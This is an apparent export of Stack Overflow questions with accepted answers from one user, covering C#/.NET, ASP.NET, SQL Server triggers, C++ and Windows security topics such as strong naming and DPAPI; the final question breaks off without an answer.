"<p>I have noticed jQuery (or is it Firefox) will turn some of my <code>&lt;span class=""presentational""&gt;&lt;/span&gt; into &lt;span class=""presentational"" /&gt;</code></p>

<p>Now my question is, is this okay to write my markup like this? Will any browsers choke on it?</p>

<p>Personally, I think it looks cleaner to do <code>&lt;span class=""presentational"" /&gt;</code> if it's going to be empty.</p>
","33708","Mehrdad","<p>Yes. It is. It'll cause problems in certain cases for old browsers.</p>

<pre><code>&lt;script type='text/javascript' src='script.js' /&gt;
</code></pre>

<p>In this case, the old browser might not understand that <code>&lt;script&gt;</code> tag has ended.</p>
"
"<p>Is it possible to override the null-coalescing operator for a class in C#?  </p>

<p>Say for example I want to return a default value if an instance is null and return the instance if it's not. The code would look like something like this:</p>

<pre><code>   return instance ?? new MyClass(""Default"");
</code></pre>

<p>But what if I would like to use the null-coalescing operator to also check if the MyClass.MyValue is set?</p>

<p>Of course there is no real need for this (at least I think so) - so before you answer ""why would you want to do that"" - <strong>I am just curious if it's possible</strong>.</p>
","33708","Mehrdad","<p>Simple answer: No</p>

<p>C# design principles do not allow operator overloading that change semantics of the language. Therefore complex operators such as compound assignment, ternary operator and ... can not be overloaded.</p>
"
"<p>As an example these are some of the things I always do when starting a new machine:</p>

<ol>
<li>Install 'Visor' - gives you an always available HUD style terminal window via F1. </li>
<li>Install 'Clix' - run a million system customization command line instructions. </li>
<li>Install 'Default App' - self explanatory. </li>
<li>Set 'Terminal.app' to open and be hidden automatically on login.</li>
<li>Install 'Inconsolata' font and set it as default font for Terminal and Text Edit.</li>
</ol>

<p>Only after those basic steps are taken can I start in on the more personal stuff.</p>

<p><strong>So, what are the essential steps you take when faced with a blank macSlate?</strong></p>

<p><em>NB: Yes, this question is inspired by <a href=""http://stackoverflow.com/questions/344468/as-a-developer-what-changes-do-you-make-to-a-vanilla-windows-install"">@Roddy's question</a> targeting the Windows platform.</em></p>

<p><strong>UPDATE:</strong> This is great, thank you! Some very interesting answers so far.</p>

<p><strong><em>Concrete Results:</em></strong> I am now a MacPorts convert, and my Terminal uses standard word left, word right, key command behavior...</p>

<p><strong>UPDATE 2:</strong> I forgot to mention <a href=""http://www.charlesproxy.com/"" rel=""nofollow"">Charles</a>, the greatest debugging http proxy app in the world (IMHO). It's shareware and 100% worthy of the name.</p>
","33708","Mehrdad","<p>Install Xcode, iPhone SDK, TextMate.</p>

<p>Add Terminal, XCode, TextMate to the dock.</p>

<p>Remove iMovie, iDVD, ... icons from the dock.</p>
"
"<p>If an object has a property that is a collection, should the object create the collection object or make a consumer check for null?  I know the consumer should not assume, just wondering if most people create the collection object if it is never added to.</p>
","33708","Mehrdad","<p>While what I say here is not universal by any means, I think collections are mostly suited as private properties which should be accessed by public methods on the object itself. Therefore, the object is responsible to create and destroy them as needed. This way, it won't be possible to set it to null from external code.</p>
"
"<p>I have the following code in a SQL Server 2005 trigger: </p>

<pre>
CREATE TRIGGER [myTrigger] ON [myTable]
FOR UPDATE,DELETE
AS
BEGIN

DECLARE @OperationType VARCHAR(6)
IF EXISTS(SELECT 1 FROM INSERTED)
BEGIN
    SET @OperationType='Update'
END
ELSE
BEGIN
    SET @OperationType='Delete'
END
</pre>

<p>My question: is there a situation in which @OperationType is not populated correctly? E.G.: the data in the table is changed by a bunch of UPDATE/DELETE statements, but the trigger is not fired once by every one of them? </p>

<p>Do you have a better way to determine if the trigger was fired by an UPDATE or DELETE statement?</p>
","33708","Mehrdad","<p>Simple answer: No, there will not be a situation in which the trigger fails to detect correctly (except when there are no changed rows).</p>

<p>The trigger will be fired once for every statement, so the thing is not possible and it will work correctly, but the point is, if you really want to do different tasks for <code>UPDATE</code> and <code>DELETE</code>, you'd better use a couple triggers.</p>
"
"<p>I have some critical logic in a finally block (with an empty try block), because I want to guarantee that the code gets executed even if the thread is aborted. However, I'd also like to detect the ThreadAbortException. I've found that wrapping my critical try/finally block in a try/catch does not catch the ThreadAbortException. Is there any way to detect it?</p>

<pre>
try {
    try { }
    finally {
        // critical logic
    }
} catch(Exception ex) {
    // ThreadAbortException is not caught here, but exceptions thrown
    // from within the critical logic are
}
</pre>

<p>Thanks!</p>
","33708","Mehrdad","<p>Read about <a href=""http://msdn.microsoft.com/en-us/library/ms228973.aspx"" rel=""nofollow"">Constrained Execution Regions</a>.</p>

<p>Specifically, the <a href=""http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.runtimehelpers.executecodewithguaranteedcleanup.aspx"" rel=""nofollow"">RuntimeHelpers.ExecuteCodeWithGuaranteedCleanup method</a> will be useful here.</p>
"
"<p>Quite a while ago, I heard about Object databases. Cool concept and all. Now, with the event of ORMs everywhere, does anyone still use any of the Object oriented Databases systems? Are they relevant? Are they practical?</p>
","33708","Mehrdad","<p>In fact, database systems are one of the areas that fundamental changes are really hard. Billions of dollars are spent on relational database systems and they are working pretty well. They are proven technology and they have been flexible enough to satisfy most needs (using ORM for example, as you said). Object databases do exist actually, even outside academia. But don't expect to see anything as big as SQL Server or Oracle in that area anytime soon. They do exist as a theory and as small, application-specific databases and various products. Basically, I predict relational databases become more object oriented in the future to handle requirements better.</p>
"
"<p>On a SQL Server 2005 database, one of our remote developers just checked in a change to a stored procedure that changed a ""select scope_identity"" to ""select @@identity"".  Do you know of any reasons why you'd use @@identity over scope_identity?</p>
","33708","Mehrdad","<p><code>@@IDENTITY</code> will return the last identity value issued by the current session. <code>SCOPE_IDENTITY()</code> returns the last identity value in the current session and same scope. They are usually the same, but assume a trigger is called which inserted something somewhere just before the current statement. <code>@@IDENTITY</code> will return the identity value by the <code>INSERT</code> statement of the trigger, not the insert statement of the block. It's usually a mistake unless he knows what he's doing.</p>
"
"<p>I have a classes like:</p>

<pre><code>[Serializable]
public class child {
     public Parent parent;
}

[Serializable]
public class Parent {
  public List&lt;child&gt; children;
}
</code></pre>

<p>When I deserialize Parent, I want each of each children to have a reference to it's parent.  Question is, where in the deserialization process can I set the child's ""parent"" pointer?  I can't seem to use a custom constructor for child, because deserialization always uses the default constructor.  If I implement ISerializable, then it seems that the child objects have already been created by the time the parent is created.  Is there another way to achieve this?</p>
","33708","Mehrdad","<p>If you leave it alone and let Parent be a public read/write property of the Child class, .NET automatic serialization process will handle it properly.</p>
"
"<p>I have a command-line process I would like to automate and capture in C#.</p>

<p>At the command line, I type:</p>

<pre><code>nslookup
</code></pre>

<p>This launches a shell which gives me a > prompt. At the prompt, I then type:</p>

<pre><code>ls -a mydomain.local
</code></pre>

<p>This returns a list of local CNAMEs from my primary DNS server and the physical machines they are attached to.</p>

<p>What I would like to do is automate this process from C#. If this were a simple command, I would just use Process.StartInfo.RedirectStandardOutput = true, but the requirement of a second step is tripping me up.</p>
","33708","Mehrdad","<pre><code>ProcessStartInfo si = new ProcessStartInfo(""nslookup"");
si.RedirectStandardInput = true;
si.RedirectStandardOutput = true;
Process nslookup = new Process(si);
nslookup.Start();
nslookup.StandardInput.WriteLine(""ls -a mydomain.local"");
nslookup.StandardInput.Flush();
// use nslookup.StandardOutput stream to read the result.
</code></pre>
"
"<p>I need to be able to change a user's password from a cron task or from an ssh session.  Is there an easy way to do that with a bash script?  If not, what's the easiest way to do it in Cocoa?</p>
","33708","Mehrdad","<p>Use the <code>passwd</code> shell command.</p>
"
"<ul>
<li>OpenId is open source and can be
implemented by anyone. </li>
<li>In both cases my credentials are
held on a third party server.</li>
<li>The only advantage I can think of
for using Microsoft Passport is the
reliability of Microsoft.</li>
</ul>
","33708","Mehrdad","<p>OpenID is a decentralized authentication system while Passport is centralized.</p>

<p>If you use OpenID, you'll not relying on any single third party provider which can shut down services or act as a big brother or ... because you are <i>using a distributed authentication mechanism</i>.</p>

<p>And you can have much more users sign in easily as all major providers (including Microsoft) are going to support OpenID in the near future. You are not forcing users to create accounts on any OpenID provider. If they want, they can run their own authentication server to sign in to your site.</p>
"
"<p>In C#, I'm trying to build an extension method for StringBuilder called AppendCollection() that would let me do this:</p>

<pre><code>var sb1 = new StringBuilder();
var sb2 = new StringBuilder();
var people = new List&lt;Person&gt;() { ...init people here... };
var orders = new List&lt;Orders&gt;() { ...init orders here... };

sb1.AppendCollection(people, p =&gt; p.ToString());
sb2.AppendCollection(orders, o =&gt; o.ToString());

string stringPeople = sb1.ToString();
string stringOrders = sb2.ToString();
</code></pre>

<p>stringPeople would end up with a line for each person in the list.  Each line would be the result of p.ToString().  Likewise for stringOrders.  I'm not quite sure how to write the code to make the lambdas work with generics.</p>
","33708","Mehrdad","<p>Use the <code>Func&lt;T,string&gt;</code> delegate.</p>

<pre><code>public static void AppendCollection&lt;T&gt;(this StringBuilder sb, 
                                       IEnumerable&lt;T&gt; collection, Func&lt;T, string&gt; method) {
   foreach(T x in collection) 
       sb.AppendLine(method(x));
}
</code></pre>
"
"<p><strong><code>oPanel = CType(Master.FindControl(""panelSearch""), Panel)</code></strong></p>

<p>This code resides on my masterpage's back-end (<strong><code>theMaster.master.vb</code></strong>), but I get a ""Cannot refer to an instance member from within a shared class or shared member initializer without an explicit instance of the class""</p>

<p>the function it resides in IS shared, I just can't remember for the life of me what I need to do to make this work.</p>

<p>thanks!</p>
","33708","Mehrdad","<p>Remove the <code>Shared</code> modifier on your method that this code is written in.</p>
"
"<p>That's the question... Do you think ASP.Net is a technology suitable for high-load sites? Do you know any populer sites -apart from stackoverflow, of course- built with this technology?
Thanks.</p>
","33708","Mehrdad","<p>MySpace, Orkut, ASP.NET Forums, Microsoft.com, ...</p>

<p>ASP.NET has great caching and load balancing features that make it suitable for high load Web sites.</p>

<p>It's also a very flexible, well-designed framework. If you don't like part of it, or think its performance intensive for your high load application, you can just throw out that layer and replace it with your own. If you don't like WebControls and Pages due to its overhead, you are able to write your own <code>HttpHandler</code>s.</p>

<p>Basically, I think ASP.NET MVC is going to be a better platform for high load and customized Web sites, since it can be more hand tuned (relative to ASP.NET pages that try to abstract away the resulting HTML, for good reasons) and works better with AJAX applications. WebControls and ViewState are two parts that usually face criticism that are pretty much gone away in MVC.</p>
"
"<p>Does anyone know how to acess a url from a windows application?.</p>

<p>I have an address <a href=""http://serverport/Page.I"" rel=""nofollow"">http://serverport/Page.I</a> want to acess this page from my windows application.</p>

<p>Regards,
Harsh Suman</p>
","33708","Mehrdad","<p>It's not clear what you want to do with the page.</p>

<p>If you want to display it on the form, you can use a <code>WebBrowser</code> control.</p>

<p>If you want to get the response and process it, use the <code>System.Net.WebClient</code> class.</p>
"
"<p>When writing fairly typical Mac code in an OS X 10.5+ environment, what are the disadvantages to using garbage collection?</p>

<p>So far everything else I've written has been either 10.4 compatible or on the iPhone, so I've become fairly comfortable with retain/release, but now that I'm working on a larger project that's 10.5 only I'm wondering if there are any downsides to just going ahead and using the Objective-C 2.0 garbage collector.</p>

<p>What do you guys think?</p>
","33708","Mehrdad","<p>If there is the possibility to port your application to the iPhone, you shouldn't use it.</p>

<p>Garbage collection <b>might</b> have adverse effect on performance if you have special use cases. Without GC, you have precise control on destruction of the object, which is not the case GC world. In most projects, it's worth it to turn on GC as it's less error prone and easier.</p>

<p>In <b>theory</b>, memory management without GC can always be faster that with GC, however, it's not the case in most practical applications (since GC is usually more optimized that human being).</p>
"
"<p>I'm temporarily using gcc 2.95.2, and instead of having a <code>sstream</code> header, it defines a (slightly different, and deprecated) <code>strstream</code>. I'm currently getting around this with</p>

<pre><code>#if __GNUC__ &lt; 3       // or whatever version number it changes
#include &lt;strstream&gt;
#else
#include &lt;sstream&gt;
#endif
</code></pre>

<p>and then things like:</p>

<pre><code>#if __GNUC__ &lt; 3
    strstream str;
    str &lt;&lt; ""Hello World"";
#else
    stringstream str(""Hello World"");
#endif
</code></pre>

<p>but it's getting really annoying. I just want to make sure that when I switch back to a more recent gcc (or some other compiler), I don't have to rewrite these passages. Any thoughts?</p>
","33708","Mehrdad","<p>Create <code>mystream.h</code> as</p>

<pre><code>#ifndef mystream

#if __GNUC__ &lt; 3       // or whatever version number it changes
#include &lt;strstream&gt;
#define mystream(x,y) strstream x; x &lt;&lt; y;
#else
#include &lt;sstream&gt;
#define mystream(x,y) sstream x(y);
#endif

#endif
</code></pre>

<p>Then use <code>mystream.h</code> header and <code>mystream</code> type instead.</p>

<p>If you really want to make it look like modern sstream, you can create a new class manually (with the help of newer std c++ library source code or manually creating a proxy class that uses strstream as the underlying way to work).</p>
"
"<p>I'm trying to find the file size of a file on a server. The following code I got from <a href=""http://www.thejackol.com/2005/06/11/aspnet-get-file-size/"" rel=""nofollow"">this guy</a> accomplishes that for your own server:</p>

<pre><code>string MyFile = ""~/photos/mymug.gif"";

FileInfo finfo = new FileInfo(Server.MapPath(MyFile));
long FileInBytes = finfo.Length;
long FileInKB = finfo.Length / 1024;

Response.Write(""File Size: "" + FileInBytes.ToString() + 
  "" bytes ("" + FileInKB.ToString() + "" KB)"");
</code></pre>

<p>It works. However, I want to find the filesize of, for example:</p>

<pre><code>string MyFile = ""http://www.google.com/intl/en_ALL/images/logo.gif"";

FileInfo finfo = new FileInfo(MyFile);
</code></pre>

<p>Then I get a pesky error saying <code>URI formats are not supported.</code></p>

<p>How can I find the file size of Google's logo with ASP.NET?</p>
","33708","Mehrdad","<p>You can use the <code>WebRequest</code> class to issue an HTTP request to the server and read the <code>Content-Length</code> header (you could probably use HTTP <code>HEAD</code> method to accomplish it). However, not all Web servers respond with a <code>Content-Length</code> header. In those cases, you have to receive all data to get the size. </p>
"
"<p>Is a string actually a character array (is-a), or does it have a character array as an internal store (has-a), or is it's own object which can expose itself as a with an array of characters?</p>

<p>I am more inclined to say it is it's own object, but then why are we so inclined to always say ""A string is an array of characters...""? </p>
","33708","Mehrdad Afshari","<p>It depends on your definition of the word ""string"".</p>

<p><code>System.String</code> type in .NET has a character array as internal store (it also stores length (which is O(1)), among other things, for example).</p>

<p>But the word string means a consecutive occurrence of something in general, which might also mean a character array :))</p>

<p>By the way, when I said <code>string</code> type has a ""character array,"" I didn't mean ""a field of type <code>char[]</code>"" specifically. I meant the general meaning of the term ""array"" as an ordered collection of something. :))</p>
"
"<p>I imagine I can compile a C# DLL and then expose it as a COM object so that it can be CreateObject'd from VBscript.  I'm just not sure the steps involved in doing this...</p>
","33708","Mehrdad Afshari","<p>You should use the <code>regasm</code> utility to register an assembly (just like you do <code>regsvr32</code> with COM servers). Then you can use it from COM. Make sure it's installed in the GAC. The stuff should have <code>[ComVisible(true)]</code> to be usable from COM.</p>
"
"<p>I know that in C#, if you write <code>~MyClass()</code>, this basically translates to <code>override System.Object.Finalize()</code>. So, whether you write the <em>destructor</em> or not, every type in CLR will have a <code>Finalize()</code> method in it (of <code>System.Object</code> at least).</p>

<p>1] So, does it mean that, every object, by default, <strong>has</strong> a finalizer ?</p>

<p>2] What is the basis for the CLR to decide that an object should be put through finalization queue ? </p>

<p>I'm asking this, because, I had a class, say <code>ManagedResourceHolder</code> that implemented <code>IDisposable</code>, but did not call <code>GC.SuppressFinalize(this)</code> in its <code>IDisposable.Dispose()</code> method. The class did not hold any unmanaged resources, and there was no need for the <code>~ManagedResourceHolder()</code> method, which in turn meant no need for the  <code>GC.SuppressFinalize(this)</code> call as there was no <em>finalizer</em>.</p>

<p>3] In context of the above scenario, is it <strong>always</strong> necessary to provide a finalizer when you implement IDisposable ? (even on a class that holds no unmanaged resources)</p>

<p>The FxCop rule <a href=""http://msdn.microsoft.com/en-us/library/ms182269.aspx"" rel=""nofollow"">CA1816</a> was giving me a violation on this and the response I got <a href=""http://social.msdn.microsoft.com/Forums/en-US/vstscode/thread/4e8a3155-6f12-4888-9ca1-f6762761e038"" rel=""nofollow"">here</a> when I asked in the CA forum on MSDN confused me.</p>

<p>Thanks.</p>
","33708","Mehrdad Afshari","<ol>
<li>Nope, it doesn't mean so. Only overridden <code>Finalize()</code> will count by the CLR.</li>
<li>By having a finalizer, as defined above.</li>
<li>Nope, it's not <b>always</b> necessary. It's just a nice pattern. I mean, nobody forces you to do so. But it's a good thing to do if you have unmanaged resources, since if somebody forgets to dispose it, the unmanaged resource will get released sometime. FxCop does not enforce strict rules. It enforces good patterns that may lead to failure in the future if you don't take care of.</li>
</ol>

<p>UPDATE: Every class is responsible for managing its own resources. Due to abstraction and encapsulation features of object-oriented paradigms, the consumer of a class should not care about what resources it has, indirectly. Therefore, you should either manually release the resources you own (what you own is what you <b>directly own</b> as you look at other things as a <b>black box</b>) or leave it to the GC to release them. For unmanaged resources, you don't have the option to leave it to the GC, so you have to release it manually. In this sense, a SafeHandle that Jon mentioned is a <b>managed abstraction of an unmanaged resource</b>, therefore it should be treated as a valuable managed resource (which is a black box that manages the finalization of that unmanaged resource itself).</p>
"
"<p>This is a somewhat bizarre question. My objectives are to understand the language design decision and to identify the possibilities of reflection in C++.</p>

<ol>
<li><p>Why C++ language committee did not go towards implementing reflection in the language? Is reflection too difficult in a language that does not run on a virtual machine (like java)?</p></li>
<li><p>If one were to implement reflection for C++, what will be the challenges?</p></li>
</ol>

<p>I guess the uses of reflection are well-known: editors can be more easily written, program code will be smaller, mocks can be generated for unit tests and so on. But it would be great if you could comment on uses of reflection too.</p>
","33708","Mehrdad Afshari","<p>Reflection requires some metadata about types to be stored somewhere that can be queried. Since C++ compiles to native machine code and undergoes heavy changes due to optimization, high level view of the application is pretty much lost in the process of compilation, consequently, it won't be possible to query them at run time. Java and .NET use a very high level representation in the binary code for virtual machines making this level of reflection possible. In some C++ implementations, however, there is something called Run Time Type Information (RTTI) which can be considered a stripped down version of reflection.</p>
"
"<p>Why is list1Instance and p lists in the Main method of the below code pointing to the same collection? </p>

<pre><code>class Person
    {
        public string FirstName = string.Empty;
        public string LastName = string.Empty;

        public Person(string firstName, string lastName) {
            this.FirstName = firstName;
            this.LastName = lastName;
        }
    }

    class List1
    {
        public List&lt;Person&gt; l1 = new List&lt;Person&gt;();

        public List1()
        {
            l1.Add(new Person(""f1"",""l1""));
            l1.Add(new Person(""f2"", ""l2""));
            l1.Add(new Person(""f3"", ""l3""));
            l1.Add(new Person(""f4"", ""l4""));
            l1.Add(new Person(""f5"", ""l5""));
        }
        public IEnumerable&lt;Person&gt; Get()
        {
            foreach (Person p in l1)
            {
                yield return p;
            }

            //return l1.AsReadOnly(); 
        }

    }  

    class Program
    {

        static void Main(string[] args)
        {
            List1 list1Instance = new List1();

            List&lt;Person&gt; p = new List&lt;Person&gt;(list1Instance.Get());           

            UpdatePersons(p);

            bool sameFirstName = (list1Instance.l1[0].FirstName == p[0].FirstName);
        }

        private static void UpdatePersons(List&lt;Person&gt; list)
        {
            list[0].FirstName = ""uf1"";
        }
    }
</code></pre>

<p>Can we change this behavior with out changing the return type of List1.Get()? </p>

<p>Thanks</p>
","33708","Mehrdad Afshari","<p>In fact, <code>IEnumerable&lt;T&gt;</code> <b>is already readonly</b>. It means you cannot alter any items in the underlying collection. You cannot alter the references to the <code>Person</code> type that are held in the collection. The return type is not read only, however, and since it's a reference type (i.e. a <code>class</code>), you can alter the original values through its reference. You should either use a <code>struct</code> as the return type (that makes a copy of the value each time it's returned, so the original value will not be altered, which can be costly, by the way) or use read only properties on the <code>Person</code> type to accomplish this task.</p>
"
"<p>We have IIS6 running on a 64-bit Windows 2003 server with 32Gb physical RAM.
Due to some older 32-bit dependencies within our .NET 3.5 ASP.NET application, we are currently forced to run our IIS worker process in 32-Bit wow64 mode which I understand gives us access to 4Gb of memory for our worker process.</p>

<p>My question is if we use the Web Garden setting and configure say 4 worker processes, can each worker process access 4Gb of memory each, thus giving us access to approx 16Gb of memory. Or are we stuck with the limit of 4Gb for out ASP.NET app?</p>
","33708","Mehrdad Afshari","<p>Yes, 4GB limit is per process. Each 32 bit process running on a 64 bit kernel has 4GB private address space limit (which is, by the way, not shared with the kernel as in a 32 bit system). You can access 4x4GB=16GB of memory, however, this 16GB is not available to a single process at once. Each can only directly access its own 4GB private memory. You should use some interprocess communication medium to access memory from other processes.</p>
"
"<p>I'm writing a C# wrapper for a third-party native library, which we have as a DLL.  I would like to be able to distribute a single DLL for the new assembly.  Is it possible for me to embed the win32 DLL in my .NET DLL, and still make calls into it using P/Invoke?  If so, how?</p>
","33708","Mehrdad Afshari","<p>I don't think you can do it directly, but it's possible to extract it at runtime to some temporary location and make call to that copy.</p>
"
"<p>I'm trying to implement a Visual Studio Addin to support cross-platform development. The addon currently only warns developer when using unsupported functions but I also want to implement a feature that informs him about functions that are implemented but produce sideffects / are unstable etc. </p>

<p>Can anyone help me? I would really appreciate this!</p>
","33708","Mehrdad Afshari","<p>Mono provides a utility to analyze application binary and check for mono support called Mono Migration Analyzer. You can probably read the source code to understand more about less supported features. You can even directly use run this tool with your add in and process the results.</p>
"
"<p>I need to implement webservices in an upcoming project and wanted to know what are the main points to base the decision on whether to implement using java or .NET</p>

<p>I'm a C++er...</p>
","33708","Mehrdad Afshari","<p>I personally prefer .NET to Java for many reasons I don't want to go through, since it doesn't really matter and is more a personal preference than a strict guideline I can recommend.</p>

<p>If you have Java infrastructure in place or using a platform other than Windows for your server applications, I strongly suggest Java. However, if you don't have anything in place and running on Windows platform, .NET is pretty cool in that area (WCF/ASMX/WSE/...).</p>
"
"<p>We are about to develop a web app from scratch using ASP.Net, and would like it to be as platform-agnostic as possible. As far as I know, the only two options for this are IIS on windows, and Mono (via Apache) on Linux.</p>

<p>The app will be follow the MVC architecture, so with all of this in mind, how difficult is it to develop the application so that it meets these requirements? (I would think that ground-up platform-agnostic development would be easier than porting an existing app.)</p>
","33708","Mehrdad Afshari","<p>Nope, it's not difficult at all. Most of the things work very well. The tricky part is configuring the server, not development. I've deployed several apps developed in Visual Studio on Apache/Mono/Ubuntu and they worked pretty well without any modifications.</p>
"
"<p>I have been reading the proper article in MSDN, <em><a href=""http://msdn.microsoft.com/en-us/library/wd40t7ad.aspx"" rel=""nofollow"">Strong-Named Assemblies</a></em> and a related Stack&nbsp;Overflow question, <em><a href=""http://stackoverflow.com/questions/308756"">Checking an assembly for a strong name</a></em>.</p>

<ol>
<li>To which extent can a strong-named assembly be verified to avoid tampering?</li>
<li>Is it possible to use strong-naming to verify an assembly author?</li>
</ol>

<p>The first question arises after reading the CSharp411 article <em><a href=""http://www.csharp411.com/net-assembly-faq-part-3-strong-names-and-signing/"" rel=""nofollow"">.NET Assembly FAQ â Part 3 â Strong Names and Signing</a></em>, which mentions this, among other problems of using strong names:</p>

<blockquote>
  <p>""<strong><em>Cannot Stop Full Replacement.</strong> Strong names cannot prevent a hacker from removing the strong name signature, maliciously modifying your assembly, re-signing it with his own key, and then passing off his assembly as yours.</em>""</p>
</blockquote>

<p>The second question intends to find the differences between strong naming and other signing schemes like, say, <a href=""http://www.iss.net/security_center/advice/Countermeasures/Authentication/Authenticode/default.htm"" rel=""nofollow"">Authenticode</a>. The same MSDN article mentioned early states:</p>

<blockquote>
  <p>""<em>Note, however, that strong names in and of themselves do not imply a level of trust like that provided, for example, by a digital signature and supporting certificate.</em>""</p>
</blockquote>

<p>Am I trying to use strong-naming for much more than it was created for? Was strong-naming created just to avoid name clashes or a new kind of ""GAC DLL Hell""?</p>
","33708","Mehrdad Afshari","<p>Authenticode relies on a third party certificate authority for certificate validation. Strong naming works like a self-signed certificate and can be treated as such. It does use standard digital signatures, but the problem lies in verifying the public key of the assembly author is indeed valid.  If you get it separately via a trusted channel from the author and you trust that channel, then yes, you can verify it just like a self-signed certificate.</p>

<p>As long as you are sure the strong name private key is kept safe by the author and you know author's public key, you can make sure it's not tampered with (to the extent you can make sure a digitally signed email is not tampered with). By the way, don't get me wrong: the quote is completely true and an attacker can easily resign the assembly or remove the existing signature. However, the resulting assembly will have a *<em>different</em> digital signature that can be checked against the original (if you have the original public key).  </p>

<p>In this case, it's similar to a self-signed certificate. If you can somehow be sure of the author's public key, you can verify the authority. However, unlike Authenticode which relies on a certificate authority, there is no straightforward, system-defined, way to distribute the public key.</p>
"
"<p>Why would IE 7 display HTTP Error ""Bad request"" 400 on the same page that Firefox loads without complaining?</p>
","33708","Mehrdad Afshari","<p>The server probably rejects the request issued by IE. It can be server problem or IE problem. However I doubt any help is possible without being more specific about the problem.</p>
"
"<p>I'm currently working on desktop application which calls third party API. After authorizing against their ""web service"", a kind of user token is returned which should be stored locally (even if user closes application).  </p>

<p>So I'm looking for solution to encrypt this token with user specific key. Does Windows (and .NET) provide some standard way for doing this? All I want is protect token from other users of same computer.</p>

<p>P.S. I can't store hash, as I need to decrypt this token at startup.</p>
","33708","Mehrdad Afshari","<p>Yeah. Windows does provide it. Check out <a href=""http://en.wikipedia.org/wiki/Data_protection_API"" rel=""nofollow"">DPAPI</a> which can be accessed by .NET Framework's <code>System.Security.Cryptography.ProtectedData</code> class (available since v2.0) to securely store sensitive information.</p>
"
"<p>Is is possible to have a local variable in an anonymous c# methods, i.e. in the following code I would like to perform the count only once.</p>

<pre><code>IQueryable&lt;Enquiry&gt; linq = db.Enquiries;

if(...) linq = linq.Where(...);

if(...) linq = linq.Where(e =&gt; 
    (x &lt;= (from p in db.Orders where p.EnquiryId == e.Id select p).Count() &amp;&amp; 
        (from p in db.Orders where p.EnquiryId == e.Id select p).Count() &lt;= y));

if(...) linq = linq.Where(...);

var result = (from e in linq select e);
</code></pre>

<p>Is there a ""let"" for anonymous functions?</p>

<p>Update:
Note that I'm adding several Where clauses after this statement so I can't close with a select.</p>

<p>/Niels</p>
","33708","Mehrdad Afshari","<p>Yes, why not?! After all it's a function, just anonymous!</p>

<p>Example:</p>

<pre><code> x =&gt; { int y = x + 1; return x + y; }
</code></pre>

<p>Or alternatively:</p>

<pre><code> delegate(int x) {
     int y = x + 1;
     return x + y;
 }
</code></pre>

<p>So your code can be written as:</p>

<pre><code>  ... = linq.Where(e =&gt; {
         var count = (from p in db.Orders where p.EnquiryId == e.Id select p).Count();
         return x &lt;= count &amp;&amp; count &lt;= y;
  });
</code></pre>

<p>UPDATE: To clarify things about the comment, it's important to know the difference between  anonymous methods and lambda expressions. An anonymous method is just like a normal method, without an explicit name. When you compile it, the compiler generates a normal method with a weird name for you instead, so it will not have any special limitations. However, one representation of an anonymous method is a lambda expression. Lambda expressions can be interpreted in a couple different ways. The first is a delegate. In that way, they are equal to an anonymous method. The second is an expression tree. This way is normally used by LINQ to SQL and some other LINQ providers. They don't execute your expression directly by any means. They parse it as an expression tree and use the tree as input data to generate the equivalent SQL statement to be run on the server. It's not executed like a method and it's not considered an anonymous method. In that case, you can't define a local variable as it's not possible to parse the lambda as an expression tree.</p>
"
"<p>I have an assembly that is targeted for .NET 3.5.</p>

<p>I have an application targeted for .NET 2.0 and wonder if I should have any trouble referencing the 3.5 assembly from the 2.0 application.</p>

<p>I understand that the IL is supposedly the same, so I'm assuming that it will work, but would like to hear some experiences from others who have tried this.</p>

<p>The runtime environment will have both 2.0 and 3.5 installed.</p>
","33708","Mehrdad Afshari","<p>There's no problem. There is only one runtime version executing the app. .NET Framework v2.0.</p>
"
"<p>I'm trying to compile a POCO with this code  </p>

<pre><code>public class MenuItem
{
    public string Name 
    { get; set; }
    public string Url
    { get; set; }
}
</code></pre>

<p>I keep getting compile errors on the gets and sets with messages like:
'MenuItem.Name.get' must declare a body because it is not marked abstract or extern.
What am I missing? I'm compiling this class in the App_Code folder of a local filesystem web site that is set to compile as .NET 3.5. I know I have done this before, but can't figure out what I am doing differently.</p>
","33708","Mehrdad Afshari","<p>Make sure your <code>Web.config</code> file contains a <code>&lt;system.codedom&gt;</code> subelement under <code>&lt;configuration&gt;</code> element like this:</p>

<pre><code>&lt;system.codedom&gt;
  &lt;compilers&gt;
    &lt;compiler language=""c#;cs;csharp"" extension="".cs"" warningLevel=""4""
              type=""Microsoft.CSharp.CSharpCodeProvider, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""&gt;
      &lt;providerOption name=""CompilerVersion"" value=""v3.5""/&gt;
      &lt;providerOption name=""WarnAsError"" value=""false""/&gt;
    &lt;/compiler&gt;
  &lt;/compilers&gt;
&lt;/system.codedom&gt;
</code></pre>

<p>The problem arises from the fact that ASP.NET is running the old version of C# compiler to compile your application (v2.0) which does not support automatic properties. In order to use .NET 3.5 features, you have to specify the compiler version in your <code>Web.config</code> explicitly.</p>
"
"<p>I have an application written in Delphi 7 which does not require an admin privilages to run.  </p>

<p>For some reason I am able to save files to c:\windows and c:\windows\system32 from within the application even though the application <b>has not requested UAC elevation</b>. I am logged in as an admin with <b>UAC turned on</b> and I haven't changed any of the default UAC settings.  The files actually show up under Windows Explorer as well.  I am not using the 'Run as Administrator' option.</p>

<p>If I try to do the same thing using WordPad under the same profile I get an error as expected.</p>

<p>Any ideas what is going on?</p>

<p>Th application is using Ole Structured Storage to save and includes the following manifest, if that helps.</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?&gt;
    &lt;assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""&gt;
    &lt;assemblyIdentity type=""win32"" name=""DelphiApplication"" version=""1.0.0.0"" processorArchitecture=""*""/&gt;
&lt;dependency&gt;
&lt;dependentAssembly&gt;
  &lt;assemblyIdentity
    type=""win32""
    name=""Microsoft.Windows.Common-Controls""
    version=""6.0.0.0""
    publicKeyToken=""6595b64144ccf1df""
    language=""*""
    processorArchitecture=""*""/&gt;
&lt;/dependentAssembly&gt;
&lt;/dependency&gt;
&lt;trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2""&gt;
            &lt;security&gt;
                    &lt;requestedPrivileges&gt;
                            &lt;requestedExecutionLevel
                                   level=""asInvoker""
                                   uiAccess=""false""/&gt;
                    &lt;/requestedPrivileges&gt;
            &lt;/security&gt;
    &lt;/trustInfo&gt;
&lt;/assembly&gt;
</code></pre>

<p>Edit: To be clear my application does not save anything to these locations by default.  I am choosing these locations via the standard file save dialog.  </p>

<p><strong>Update</strong></p>

